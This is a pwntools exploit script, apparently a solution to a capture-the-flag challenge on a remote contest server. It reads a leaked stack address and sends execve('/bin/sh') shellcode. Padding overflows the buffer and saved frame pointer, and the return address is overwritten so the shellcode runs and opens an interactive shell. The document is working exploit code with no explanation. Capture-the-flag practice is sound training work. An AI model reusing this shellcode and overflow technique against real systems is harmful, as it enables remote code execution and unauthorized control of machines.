from pwn import *

# r = process('./vuln')
r=remote("challs.watctf.org", 1991)

#leak address
r.recvuntil(b'Addr: ')
leaked_buf=int(r.recvline().strip(),16)
print(f'Leakbuf: {hex(leaked_buf)}')
shellcode = b'\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05'
payload  = shellcode
payload += b"A" * (0x50 - len(shellcode))  # fill buffer
payload += b"B" * 8                        # overwrite saved RBP
payload += p64(leaked_buf)     

r.sendline(payload)
r.interactive()
